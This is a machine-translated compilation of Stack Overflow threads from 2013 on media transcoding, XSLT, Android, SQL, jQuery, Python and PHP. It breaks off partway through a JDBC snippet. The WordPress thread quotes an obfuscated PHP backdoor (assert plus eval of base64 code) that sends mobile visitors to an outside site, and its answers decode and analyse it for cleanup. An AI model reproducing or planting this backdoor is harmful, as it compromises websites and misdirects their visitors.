> 时间：2013-04-01T16:29:19.317

尝试将其粘贴到终端：

`cd ~/Desktop/sourcefolder; for f in *.mxf; do /Applications/VLC.app/Contents/MacOS/VLC -I dummy "$f" --sout "#transcode{vcodec=mp2v,vb=3072,acodec=mp4a,ab=256}:standard{mux=ts,dst=${f%mxf}ts,access=file}" vlc://quit; done`

这不会重新编码文件：

```
for f in *.mxf; do ffmpeg -i "$f" -c copy "${f%mxf}mkv"; done 
```

但它可能不适用于损坏的文件。[您可以在安装Homebrew](http://mxcl.github.com/homebrew/)`brew install ffmpeg`后安装 ffmpeg 。

# javascript - 创建 xml 属性值的下拉列表

> ID：15738054
> 
> 赞同：-1
> 
> 时间：2013-04-01T05:23:25.737
> 
> 标签：javascript, html, xml, xslt, xpath

这是我的 xml 文件：-

```
<child_2 entity_id="2" value="Root" parent_id="1">
    <child_4 entity_id="4" value="Activities" parent_id="2">
        <child_10066 entity_id="10066" value="Physical1" parent_id="4">
            <child_10067 entity_id="10067" value="Cricket" parent_id="10066">
                <child_10068 entity_id="10068" value="One Day" parent_id="10067"/>
            </child_10067>
        </child_10066>
        <child_10069 entity_id="10069" value="Test2" parent_id="4"/>
        <child_10070 entity_id="10070" value="Test3" parent_id="4"/>
        <child_10071 entity_id="10071" value="Test4" parent_id="4"/>
        <child_10072 entity_id="10072" value="Test5" parent_id="4"/>
        <child_5 entity_id="5" value="Physical" parent_id="4"/>
    </child_4>
</child_2> 
```

我想从下拉列表开始，`child_4`所有的孩子都是这种类型的：-

```
<select>
    <option>Activities</option>
    <option>Physical1</option>
    <option>Cricket</option>
    <option>One DAy</option>
    <option>Test2</option>
    <option>Test3</option>
    <option>Test4</option>
    <option>Test5</option>
    <option>Physical</option>
</select><br> 
```

这是我的 xslt:-

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" omit-xml-declaration="yes"/>
  <xsl:key name="kType" match="child_2" use="value"/>
  <xsl:template match="/">
  <select name="productGroup" id="productGroup">
      <xsl:apply-templates 
        select="child_2/child_4[generate-id() = 
                                 generate-id(key('kGroup', group)[1])]" />
    </select>
 </xsl:template>
 <xsl:template match="child_2">
 <option value="[@value]">
    <xsl:value-of select="@value"/>
</option>
</xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T09:17:22.550

这是一个选项：

### 样式表

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" omit-xml-declaration="yes"/>

  <xsl:template match="/">
    <xsl:apply-templates/>
  </xsl:template>

  <xsl:template match="child_4">
    <!--
    Retained @name and @id attributes because they were in your original XSLT code
    -->
    <select name="productGroup" id="productGroup">
      <!-- Apply the @value attribute on this element and all its descendants -->
      <xsl:apply-templates select="descendant-or-self::*/@value"/>
    </select>
  </xsl:template>

  <xsl:template match="@value">
    <option>
      <xsl:value-of select="."/>
    </option>
  </xsl:template>
</xsl:stylesheet> 
```

### 输入

```
<child_2 entity_id="2" value="Root" parent_id="1">
  <child_4 entity_id="4" value="Activities" parent_id="2">
    <child_10066 entity_id="10066" value="Physical1" parent_id="4">
      <child_10067 entity_id="10067" value="Cricket" parent_id="10066">
        <child_10068 entity_id="10068" value="One Day" parent_id="10067"/>
      </child_10067>
    </child_10066>
    <child_10069 entity_id="10069" value="Test2" parent_id="4"/>
    <child_10070 entity_id="10070" value="Test3" parent_id="4"/>
    <child_10071 entity_id="10071" value="Test4" parent_id="4"/>
    <child_10072 entity_id="10072" value="Test5" parent_id="4"/>
    <child_5 entity_id="5" value="Physical" parent_id="4"/>
  </child_4>
</child_2> 
```

### 输出

```
<select name="productGroup" id="productGroup">
  <option>Activities</option>
  <option>Physical1</option>
  <option>Cricket</option>
  <option>One Day</option>
  <option>Test2</option>
  <option>Test3</option>
  <option>Test4</option>
  <option>Test5</option>
  <option>Physical</option>
</select> 
```

# android - 使用 Intent.ACTION_VIEW 时禁用历史记录

> ID：15738058
> 
> 赞同：0
> 
> 时间：2013-04-01T05:23:59.360
> 
> 标签：android, android-intent

当我使用 Intent.ACTION_VIEW 打开指定的 URL 时，如下所示：

```
String url = "http://www.example.com";
Intent i = new Intent(Intent.ACTION_VIEW);
i.setData(Uri.parse(url));
startActivity(i); 
```

我可以禁用已启动浏览器的历史列表吗？

# c# - SocketAsyncEventArgs 示例中缺少 AsyncUserToken 类：如何使示例工作？

> ID：15738062
> 
> 赞同：6
> 
> 时间：2013-04-01T05:24:27.343
> 
> 标签：c#, .net, sockets, tcp

我正在研究 TCP 多线程服务器和客户端。我从微软网站上找到了一些代码：http: [//msdn.microsoft.com/en-us/library/system.net.sockets.socketasynceventargs.aspx](http://msdn.microsoft.com/en-us/library/system.net.sockets.socketasynceventargs.aspx)

但是我收到以下错误：

> 找不到类型或命名空间名称“AsyncUserToken”（您是否缺少 using 指令或程序集引用？）

即使我在 Google 上搜索，我也找不到要包含的名称空间，以下是我目前拥有的名称空间：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading; 
```

感谢帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-01-05T15:07:35.750

该类**不是 .NET 框架的**`AsyncUserToken`一部分。看起来它已在[Microsoft 示例](http://msdn.microsoft.com/en-us/library/system.net.sockets.socketasynceventargs.aspx)中被遗忘。

 **您可以使用属性创建自己的`AsyncUserToken`类`Socket`（对应于用于执行 I/O 操作的套接字）：

```
internal class AsyncUserToken
{
  public System.Net.Sockets.Socket Socket { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:41:14.830

好吧，我想我发现了一些相关的东西：http: [//www.codeproject.com/Articles/22918/How-To-Use-the-SocketAsyncEventArgs-Class](http://www.codeproject.com/Articles/22918/How-To-Use-the-SocketAsyncEventArgs-Class)**

# android - 如何在循环中的线性布局中添加多个文本视图

> ID：15738066
> 
> 赞同：1
> 
> 时间：2013-04-01T05:24:57.050
> 
> 标签：android, android-layout

我想通过循环向线性布局添加一些文本视图，但我想我只是添加一个，因为我的文本视图的文本没有垂直显示。

```
LinearLayout llPrincipal = (LinearLayout)findViewById(R.id.mainLayout);

int contador = 0;
while ((inputString = inputReader.readLine()) != null) {
    contador++;
    stringBuffer.append(inputString + "\n");
    TextView tvRutina = new TextView(this);
    tvRutina.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
    tvRutina.setPadding(0, 3, 0, 3);
    tvRutina.setId(contador);
    tvRutina.setText(inputString);

    llPrincipal.addView(tvRutina);
} 
```

xml:

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:id="@+id/mainLayout"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical"
tools:context=".MainActivity" > 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:29:51.850

只需在您的 while 循环中添加以下代码：-

```
LinearLayout A = new LinearLayout(this);
A.setOrientation(LinearLayout.VERTICALLY);
llPrincipal .addView(A); 
```

或者

```
while ((inputString = inputReader.readLine()) != null) {
    LinearLayout A = new LinearLayout(this);
A.setOrientation(LinearLayout.VERTICALLY);
contador++;
stringBuffer.append(inputString + "\n");
TextView tvRutina = new TextView(this);
tvRutina.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
tvRutina.setPadding(0, 3, 0, 3);
tvRutina.setId(contador);
tvRutina.setText(inputString);

A.addView(tvRutina);
llPrincipal .addView(A);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:30:28.020

```
LinearLayout MainLL= (LinearLayout) findViewById(R.id.myLayoutId); 
for(int i=0; i<5; i++){
 TextView text = new TextView(this);
 text.setText("The Value of i is :"+i); // <-- does it really compile without the + sign?
 text.setTextSize(12);  
 text.setGravity(Gravity.LEFT);
 text.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,          

 LayoutParams.WRAP_CONTENT));
 MainLL.addView(text);
} 
```

# sql - 显示一列到另一列的交替行

> ID：15738067
> 
> 赞同：1
> 
> 时间：2013-04-01T05:24:59.087
> 
> 标签：sql, sql-server, tsql

我有下表：

```
Vehicle Id  Arrival Time    Position
4              20              200
4              10              100
4              30              300
4              40              400 
```

我想像下面这样安排它：

```
Vehicle Id  Arrival Time    Start Position  End Position
4                10             100             200
4                20             200             300
4                30             300             400
4                40             400              -- 
```

我可以使用函数来解决问题，但是`LEAD`我想使用函数来解决它。`ROW_NUMBER ()``JOIN`

我认为`ROW_NUMBER ()`功能将像：

```
SELECT
   *, 
   ROW_NUMBER () OVER (PARTITION BY Vehicle Id ORDER BY Vehicle Id, Arrival Time) AS RN 
FROM Table_name 
```

但我不确定我将如何使用`JOIN`or`INNER JOIN`函数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:59:01.520

您也可以将选项与 OUTER [APPLY](http://msdn.microsoft.com/en-us/library/ms175156%28v=sql.105%29.aspx)运算符与[ORDER BY](http://msdn.microsoft.com/en-us/library/ms188385.aspx)子句一起使用

```
SELECT t.VehicleId, t.ArrivalTime, 
       t.Position AS StartPosition, o.Position AS EndPosition
FROM dbo.test59 t OUTER APPLY (
                               SELECT TOP 1 Position
                               FROM dbo.test59 t2
                               WHERE t.VehicleId = t2.VehicleId
                                 AND t.ArrivalTime < t2.ArrivalTime
                               ORDER BY t2.ArrivalTime ASC
                               ) o
ORDER BY t.ArrivalTime 
```

[**SQLFiddle**](http://sqlfiddle.com/#!3/9991f/1)上的演示[](http://sqlfiddle.com/#!3/9991f/1)

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:30:36.137

`LEAD()`如果您想使用`ROW_NUMBER()`and ，您仍然可以使用 using 获得相同的结果`Common table Expression`。

```
WITH recordList
AS
(
    SELECT  VehicleId, ArrivalTime, Position,
            ROW_NUMBER() OVER (ORDER BY VehicleId, ArrivalTime) rn
    FROM    tableName
)
SELECT  a.VehicleId, 
        a.ArrivalTime, 
        a.Position StartPosition,
        b.Position EndPosition
FROM    recordList a
        LEFT JOIN recordList b
            ON a.rn + 1 = b.rn 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!3/429fef/4)

输出

```
╔═══════════╦═════════════╦═══════════════╦═════════════╗
║ VEHICLEID ║ ARRIVALTIME ║ STARTPOSITION ║ ENDPOSITION ║
╠═══════════╬═════════════╬═══════════════╬═════════════╣
║         4 ║          10 ║           100 ║ 200         ║
║         4 ║          20 ║           200 ║ 300         ║
║         4 ║          30 ║           300 ║ 400         ║
║         4 ║          40 ║           400 ║ (null)      ║
╚═══════════╩═════════════╩═══════════════╩═════════════╝ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:33:16.520

请试试：

```
;WITH T as (
    select *, row_number() over (order by [Arrival Time]) RNum 
    from( 
        select 4 as [Vehicle Id], 20 [Arrival Time], 200 as Position union
        select 4 as [Vehicle Id], 10 [Arrival Time], 100 as Position union
        select 4 as [Vehicle Id], 30 [Arrival Time], 300 as Position union
        select 4 as [Vehicle Id], 40 [Arrival Time], 400 as Position
    )x
)
select 
    [Vehicle Id], 
    [Arrival Time], 
    Position as [Start Position], 
    (SELECT Position From T t2 WHERE t2.RNum=t1.Rnum+1)
from T t1 
```**

# jquery - 滚动时jQuery更改背景图像

> ID：15738080
> 
> 赞同：1
> 
> 时间：2013-04-01T05:26:01.557
> 
> 标签：jquery, css, image, background, scroll

我一直在努力尝试在滚动时更改背景图像。我尝试了发布到类似问题的解决方案，但到目前为止没有运气，它只会显示第一个背景图像。

基本上，我将背景设置为固定位置和几个 div，每个 div 的大小都是视口的大小，每个上边距都是视口高度的大小。换句话说，当滚动时，用户只有在滚动经过每个 div 后才能看到背景图像。我希望背景图像在他们滚动过去每个 div 后发生变化。

这是代码：

```
$(window).scroll(function() {
    var windowY = $(window).height();
    var scrolledY = $(window).scrollTop();
    var image_url = '/images/image1.jpg';

    if (scrolledY > windowY) {
        image_url = '/images/image2.jpg';
        }

    $('body').css('background', "url(" + img_url + ")");

}); 
```

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:29:20.577

你有两个错别字，括号然后是你的`image_url`变量名。最初你有：

```
$(body).css('background', "url(" + img_url) + "'"; 
```

改成：

```
$(body).css('background', "url(" + image_url + ")"); 
```

括号不正确，最终连接的字符串也是如此。此外，您的变量被声明为`image_url`，但在您`css`使用的函数中`img_url`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:33:40.763

将调用更改为您的背景属性

```
$(window).scroll(function() {
    var windowY = $(window).height();
    var scrolledY = $(window).scrollTop();
    var image_url = '/images/image1.jpg';

    if (scrolledY > windowY) {
    image_url = '/images/image2.jpg';
    backgroundChange(image_url);
    }
});

function backgroundChange(img_url){
  $("body").css("background", "url(" + img_url + ")");
} 
```

# wordpress - WordPress网站被黑

> ID：15738084
> 
> 赞同：-2
> 
> 时间：2013-04-01T05:26:31.090
> 
> 标签：wordpress, web

我有一个网站（wordpress）并托管在共享托管服务器上，该网站在台式机和笔记本电脑上可以正常打开，但是当我们在移动设备上打开它时，一些色情网站正在打开，甚至 .htaccess 文件的代码也被更改.

代码是

```
<?php
$_ = strrev("tress\x61"); @$_("e\166a\154\050b\141\163\145\066\064\137\144\145c\157\144\145\050'aWYgKChwcmVnX21hdGNoKCcvdGV4dFwvdm5kLndhcC53bWx8YXBwbGljYXRpb25cL3ZuZC53YXAueGh0bWxcK3htbC9zaScsIEAkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgfHwgcHJlZ19tYXRjaCgnL2FsY2F0ZWx8YW1vaXxhbmRyb2lkfGF2YW50Z298YmxhY2tiZXJyeXxiZW5xfGNlbGx8Y3JpY2tldHxkb2NvbW98ZWxhaW5lfGh0Y3xpZW1vYmlsZXxpcGhvbmV8aXBhZHxpcGFxfGlwb2R8ajJtZXxqYXZhfG9wZXJhLm1pbml8bWlkcHxtbXB8bW9iaXxtb3Rvcm9sYXxuZWMtfG5va2lhfHBhbG18cGFuYXNvbmljfHBoaWxpcHN8cGhvbmV8c2FnZW18c2hhcnB8c2llLXxzbWFydHBob25lfHNvbnl8c3ltYmlhbnx0LW1vYmlsZXx0ZWx1c3x1cFwuYnJvd3Nlcnx1cFwubGlua3x2b2RhZm9uZXx3YXB8d2Vib3N8d2lyZWxlc3N8eGRhfHhvb218enRlL3NpJywgQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgfHwgcHJlZ19tYXRjaCgnL21zZWFyY2h8bVw/cT0vc2knLCBAJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgJiYgIXByZWdfbWF0Y2goJy9tYWNpbnRvc2h8YW1lcmljYXxhdmFudHxkb3dubG9hZHx3aW5kb3dzXC1tZWRpYVwtcGxheWVyfHlhbmRleHxnb29nbGUvc2knLCBAJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgeyBlY2hvICc8c2NyaXB0PndpbmRvdy5sb2NhdGlvbj0iaHR0cDovL21vYmlsZS1tb2JpLmluZm8vPzIiPC9zY3JpcHQ+JzsgZmx1c2goKTsgZXhpdDsgfQ=='\051\051\073");
?> 
```

请帮忙，

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:44:21.777

抱歉这个问题，我试图解码你的示例代码。

这是：

```
if ((preg_match('/text\/vnd.wap.wml|application\/vnd.wap.xhtml\+xml/si', @$_SERVER['HTTP_ACCEPT']) || preg_match('/alcatel|amoi|android|avantgo|blackberry|benq|cell|cricket|docomo|elaine|htc|iemobile|iphone|ipad|ipaq|ipod|j2me|java|opera.mini|midp|mmp|mobi|motorola|nec-|nokia|palm|panasonic|philips|phone|sagem|sharp|sie-|smartphone|sony|symbian|t-mobile|telus|up\.browser|up\.link|vodafone|wap|webos|wireless|xda|xoom|zte/si', @$_SERVER['HTTP_USER_AGENT']) || preg_match('/msearch|m\?q=/si', @$_SERVER['HTTP_REFERER'])) && !preg_match('/macintosh|america|avant|download|windows\-media\-player|yandex|google/si', @$_SERVER['HTTP_USER_AGENT'])) { echo '<script>window.location="http://mobile-mobi.info/?2"</script>'; flush(); exit; } 
```

这会将使用移动设备的访问者重定向到特定站点。

我建议您使用**恶意软件扫描程序来检查您的网站**，我在服务器上使用 clamav 并在本地服务器上使用 avast 来扫描此代码，但未检测到病毒（可能是他们的数据库未更新此恶意软件信息）。

我建议您仍然需要使用恶意软件扫描程序之一来扫描您的网站，以扫描您的网站以检测其他病毒。另外，您可以使用 grep 命令搜索具有此代码的任何文件并将其手动删除

grep 命令是：

```
grep -R 'strrev("tress\x61");' /var/www/html 
```

替换`/var/www/html`为您网站的根路径。

P/S：对不起，如果我的英语不是很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:32:34.577

1.  将您的 wordpress 更新到最新版本。
2.  更新您的插件 + 主题。
3.  对所有类似代码的文件进行快速“查找和替换”。
4.  更改 wordpress/ftp/mysql/cp/webhost 的密码。
5.  在你的 wordpress 上安装杀毒软件（你可以在他们的网站上找到很多）。
6.  询问您的主机客户支持他们是否受到黑客等的攻击。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:47:28.663

您应该阅读[Hardening Wordpress](http://codex.wordpress.org/Hardening_WordPress)指南 - 如果您`.htaccess`能够通过网络由某人编写，那么您有一个相当大的安全漏洞（如果不是多个）。

您*肯定*想从您的 中删除该代码`.htaccess`，我做了一些测试，实际上它是重定向到色情网站的内容。第一行将值“assert”分配给变量`$_`，然后使用它来运行经过 Base64 编码的代码。简而言之，它会对您的变量进行一些匹配，并通过检查和`HTTP_ACCEPT`确保您不是来自搜索引擎。如果您不将 a作为查询字符串变量附加，它重定向到的 URL 只会将您发送到 Google。`HTTP_USER_AGENT``HTTP_REFERER``?2`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T05:48:47.667

我试图解码上面的代码行， `$_ = strrev("tress\x61");`这一行将返回一个断言函数，并且

```
@$_("e\166a\154\050b\141\163\145\066\064\137\144\145c\157\144\145\050'aWYgKChwcmVnX21hdGNoKCcvdGV4dFwvdm5kLndhcC53bWx8YXBwbGljYXRpb25cL3ZuZC53YXAueGh0bWxcK3htbC9zaScsIEAkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgfHwgcHJlZ19tYXRjaCgnL2FsY2F0ZWx8YW1vaXxhbmRyb2lkfGF2YW50Z298YmxhY2tiZXJyeXxiZW5xfGNlbGx8Y3JpY2tldHxkb2NvbW98ZWxhaW5lfGh0Y3xpZW1vYmlsZXxpcGhvbmV8aXBhZHxpcGFxfGlwb2R8ajJtZXxqYXZhfG9wZXJhLm1pbml8bWlkcHxtbXB8bW9iaXxtb3Rvcm9sYXxuZWMtfG5va2lhfHBhbG18cGFuYXNvbmljfHBoaWxpcHN8cGhvbmV8c2FnZW18c2hhcnB8c2llLXxzbWFydHBob25lfHNvbnl8c3ltYmlhbnx0LW1vYmlsZXx0ZWx1c3x1cFwuYnJvd3Nlcnx1cFwubGlua3x2b2RhZm9uZXx3YXB8d2Vib3N8d2lyZWxlc3N8eGRhfHhvb218enRlL3NpJywgQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgfHwgcHJlZ19tYXRjaCgnL21zZWFyY2h8bVw/cT0vc2knLCBAJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgJiYgIXByZWdfbWF0Y2goJy9tYWNpbnRvc2h8YW1lcmljYXxhdmFudHxkb3dubG9hZHx3aW5kb3dzXC1tZWRpYVwtcGxheWVyfHlhbmRleHxnb29nbGUvc2knLCBAJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgeyBlY2hvICc8c2NyaXB0PndpbmRvdy5sb2NhdGlvbj0iaHR0cDovL21vYmlsZS1tb2JpLmluZm8vPzIiPC9zY3JpcHQ+JzsgZmx1c2goKTsgZXhpdDsgfQ=='\051\051\073"); 
```

正在使用以下参数调用 assert 函数。

```
eval(base64_decode('malicious code encoded as base64')) 
```

所以完整的形式如下

```
assert( eval (base64_decode('malicious code encoded as base64'))); 
```

部分恶意代码正在检查请求是否来自任何移动设备、平板电脑或 ipad 等。

```
if ((preg_match('/text\/vnd.wap.wml|application\/vnd.wap.xhtml\+xml/si', @$_SERVER['HTTP_ACCEPT']) || preg_match('/alcatel|amoi|android|avantgo|blackberry|benq|cell|cricket|docomo|elaine|htc|iemobile|iphone|ipad|ipaq|ipod|j2me|java|opera.mini|midp|mmp|mobi|motorola|nec-|nokia|palm|panasonic|philips|phone|sagem|sharp|sie-|smartphone|sony|symbian|t-mobile|telus|up\.browser|up\.link|vodafone|wap|webos|wireless|xda|xoom|zte/si', @$_SERVER['HTTP_USER_AGENT']) || preg_match('/msearch|m\?q=/si', @$_SERVER['HTTP_REFERER'])) && !preg_match('/macintosh|america|avant|download|windows\-media\-player|yandex|google/si', @$_SERVER['HTTP_USER_AGENT'])) { 
```

**结论** 此恶意代码检查请求是否来自移动设备（移动设备、iPad 或任何平板电脑或特定浏览器），然后重定向此请求。

您已经找到了有问题的代码，将其从您的目录中删除，您用于托管的服务器，确保其安全并具有防病毒功能，更改您的密码可能会有所帮助，同时检查您的系统是否在您上传到此代码时正确嵌入了此代码断绝。它可能不是服务器，而是您的系统。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-04T10:57:31.843

大多数 wordpress hack 来自：

*   timthumb 图像大小调整插件包含在一些主题中
*   uploadify 插件提供一些上传功能
*   简单的管理员密码（例如 admin / p@ssw0rd）
*   允许共享计算机上的其他用户读取 wp-config.php 文件或更改您的文件（例如可写目录）的不安全权限。
*   黑客预先存在的访问权限（例如，您一直忠实上传的某个后门脚本）

如果您无法使机器上的其他用户无法读取您的 wp-config.php，那么在您移动站点之前，您的问题将永远无法解决。

# python - Python单下划线和双下划线变量的问题

> ID：15738086
> 
> 赞同：5
> 
> 时间：2013-04-01T05:26:46.643
> 
> 标签：python, inheritance

我不确定我做错了什么；或者为什么会这样。

我有以下代码：

```
class Expression (Node):
  """
  ...
  """

  def __init__ (self):
    self.__expressionType = None

  def expressionType (self):
    return self.__expressionType

class Number (Expression):
  """
  Number .
  """

  def __init__ (self, value):
    """
    Value is an entry of type Constant.
    """
    Expression.__init__(self)
    assert isinstance (value, KST.Constant)
    self.__constant = value
    self.__expressionType = value.elementType() 
```

对于一个数字对象 say `n = Number(KST.Constant(..))`，对于以下语句，我总是返回 None ——</p>

```
 n.expressionType() 
```

现在，如果我将双下划线更改为单下划线，一切正常。我了解私有变量和半私有变量之间的区别，但为什么会发生这种情况——我不知道。此外，我在其他许多地方都使用了“__”，而且一切似乎都很好。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T05:31:15.090

带有双下划线的属性名称是“[错位](http://docs.python.org/2/tutorial/classes.html#private-variables-and-class-local-references)的”，以便在子类中更难出现名称冲突。

所以使用单下划线。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-01T10:35:31.080

正如其他人指出的那样，会发生“名称混乱”。简单来说，Python 会更改变量名，使程序员无法通过纯内存访问它们。

例子：

```
class A():
  var1 = 10    # typical variable
  __var2 = 20  # double-underscored variable 
```

现在您会注意到您无法访问双下划线变量..

```
>>> A.var1
10
>>> A.__var2
  AttributeError: type object 'A' has no attribute '__var2' 
```

..除非你知道 Python 如何改变你的变量名

```
>>> a._A__var2
20 
```

这本质上与`private`Java 和其他编程语言中的行为相同，您不希望程序员意外更改值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:42:27.810

这是因为[*名称修改*](http://docs.python.org/2/tutorial/classes.html#private-variables-and-class-local-references)正在发生。

*   `expressionType`中定义`Expression`。
*   `n.__expressionType`将转换为`n._Expression__expressionType`.
*   如果您将相同的`expressionType`方法复制粘贴到类`Number`中，那么由于方法解析顺序，它将采用出现在`Number`where 中`self.__expressionType`的定义`self._Number__expressionType`。

`n._Expression__expressionType`!= `n._Number__expressionType`。

这实际上会起作用：

```
class Expression(Node):
  def __init__(self):
    self.__expressionType = None
  def expressionType(self):
    return self.__expressionType

class Number(Expression):
  def __init__ (self, value):
    Expression.__init__(self)
    assert isinstance (value, KST.Constant)
    self.__constant = value
    self.__expressionType = value.elementType()
  def expressionType (self):
    return self.__expressionType 
```

但是，存在代码重复，因此使用单个下划线更好，因为它不会破坏属性的名称。

# php - 什么是在 php 中合并 2 个数组的最快方法

> ID：15738089
> 
> 赞同：-2
> 
> 时间：2013-04-01T05:26:56.067
> 
> 标签：php, arrays, merge

我有 2 个数组：

```
1st array {0=> "google", 1=> "apple", 2=> "microsoft"}
2nd array {0=> "awesome", 1=> "sucks", 2=> "oh man!"} 
```

现在我想要以这种形式合并 2 个数组：

```
array {"google"=>"awesome", "apple"=>"sucks", "microsoft"="oh man!"} 
```

最有效的方法是什么？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T05:29:06.293

采用`array_combine — Creates an array by using one array for keys and another for its values`

```
$a = array(0=> "google", 1=> "apple", 2=> "microsoft");
$b = array(0=> "awesome", 1=> "sucks", 2=> "oh man!");

$c = array_combine($a, $b);

print_r($c); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:31:48.437

您是否尝试过使用**array_combine** ..??像这样尝试

```
$array3 = array_combine($array1, $array2); 
print_r($array3); 
```

你会喜欢

```
array {"google"=>"awesome", "apple"=>"sucks", "microsoft"="oh man!"} 
```

您也可以尝试使用“ **array_merge** ”

```
$array3 = array_merge($array1, $array2);
print_r($array3); 
```

# forms - php isset , 空 , null , = ""

> ID：15738091
> 
> 赞同：0
> 
> 时间：2013-04-01T05:27:07.377
> 
> 标签：forms, get, http-post, isset, is-empty

```
<div>
    <h2>How many services do you need ?</h2>
    <form action="<?php $_SERVER['PHP_SELF']?>" method="GET" name="fServ">
    <input type="number" name="numServ" />
    <input type="submit" value="SEND">
    </form>
<div>
    <?php

    if(isset($_GET['numServ'])){
        echo "We need ".$_GET['numServ']." services";
    }
    if(!isset($_GET['numServ'])){
        echo "We don't have any services yet.";
    }
    else if($_GET['numServ']=""){
        echo "Please put in a number";
    } 
```

假设您有以下表格，如果我输入一个数字或在第一次加载时访问该表格，它就可以工作。但是我永远不能在最后一个 if 语句中：（输入一个数字）

我尝试过使用 POST 和 GET 方法。GET 方法将显示： **.php?numServ=**

我试过 ：

```
if((isset($_POST['numServ']) && $_POST['numServ']=="")

if(empty($_POST['numServ']))

if(is_null($_POST['numServ']))

if($_POST['numServ'] == "")

if($_POST['numServ'] == null) 
```

我仍然不能落入最后的状态。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:34:35.863

我可以在代码中看到的一件事

```
if($_GET['numServ']="") 
```

您在这里使用赋值运算符请将其替换为

```
if($_GET['numServ']=="") 
```

你应该对 get 方法没问题

# string - “const char *”和“const string”之间的确切技术区别是什么

> ID：15738095
> 
> 赞同：6
> 
> 时间：2013-04-01T05:27:25.887
> 
> 标签：string, char, constants

我需要对我要问的问题进行深入的技术解释，而不是解决方案。

我已经学习了一个星期的指针，我理解得很好。但是在编写程序时，我偶然发现了这个错误：

```
无法将参数 '2' 的 'const std::string' 转换为 'const char*' 到 'char* strcpy(char*, const char*)'</pre>

所以我很容易解决，`string.c_str()`没有任何问题。但我对为什么会这样很感兴趣。我一直在疯狂搜索为什么 const 字符串与`const`char * 不同。当人们解释一个字符串时，他们说它与 char * 没有什么不同，那么为什么在字符串之前添加一个 const 不能使它成为 a`const char *`呢？

```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-01T05:31:12.167

`string`是**一个**用于保存文本数据（字符串）的对象，`char*`是**一个指向**用于保存文本数据（字符串）的内存块的指针。

A `string`“知道”它的长度，但 a`char*`只是一个指针（指向一个字符数组）——它没有长度信息。因此，为了让您能够推断出由 a 表示的“字符串”的长度`char*`，您必须用一些特殊的东西来终止它，这通常是`'\0'`C中的空字符。

但是 a`string`并不会终止自身`'\0'`（这是无益的额外工作），所以问题就变成了：如果您需要在两种格式之间进行转换怎么办？

从 a 转换`char*`为 a`string`可以隐式发生 -`string`有一个专门用于此目的的构造函数。但是反过来，您必须*告诉*`string`对象以空值终止自身，并为您的目的提供一个有效的指针。（它不会隐含地这样做，因为它可能需要额外的工作和/或导致代码事故。）

# java - 如何在jdbc程序中使用dll

> ID：15738098
> 
> 赞同：-2
> 
> 时间：2013-04-01T05:27:40.067
> 
> 标签：java, dll, jdbc

我正在开发一个简单的 jdbc 程序。如何在 jdbc 程序中使用扩展的 dll 功能。

这是我的代码：

```
import java.sql.*;

public class jdbc2
{

    // JDBC driver name and database URL
    static final String JDBC_DRIVER = "com.mysql.jdbc.Driver";
    static final String DB_URL = "jdbc:mysql://localhost:3306/somesh";

    //  Database credentials
    static final String USER = "root";
    static final String PASS = "";

    public static void main(String[] args)
    {
        Connection conn = null;
        Statement stmt = null;
        try{
            //STEP 2: Register JDBC driver
            Class.forName("com.mysql.jdbc.Driver");

            //STEP 3: Open a connection
            // System.out.println("Connecting to database...");
            conn = DriverManager.getConnection(DB_URL,USER,PASS);
            System.out.println("Connecting to database...");
            //STEP 4: Execute a query
            System.out.println("Creating statement...");
            stmt = conn.createStatement();
            String sql;
            sql = " select id,image from images1 ";
            ResultSet rs  = stmt.executeQuery(sql);

            //STEP 5: Extract data from result set
            while(rs.next())
            {
                //Retrieve by column name
                System.out.println("\n");
                int no = rs.getInt("id");
